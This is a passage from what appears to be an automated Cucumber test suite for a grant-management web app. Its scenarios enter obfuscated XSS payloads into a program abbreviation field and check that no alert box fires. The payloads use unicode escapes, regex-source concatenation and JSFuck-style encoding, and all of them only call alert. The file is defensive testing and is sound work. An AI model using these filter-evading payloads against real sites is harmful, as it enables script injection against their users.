      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | ';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301692 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | ';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301693 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | ;globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301694 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';window[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301695 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';self[/al/.source+/ert/.source](/XSS/.source);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301696 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';this[/al/.source+/ert/.source](/XSS/.source);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301698 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      |  ';top[/al/.source+/ert/.source](/XSS/.source);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301699 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';parent[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301700 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';frames[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301701 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';globalThis[/al/.source+/ert/.source](/XSS/.source);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301702 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      |';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301703 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      |';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301704 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      |';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301705 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      | ';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301706 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      |  ';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301706 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      |   ';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301708 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      |   ';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//    | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
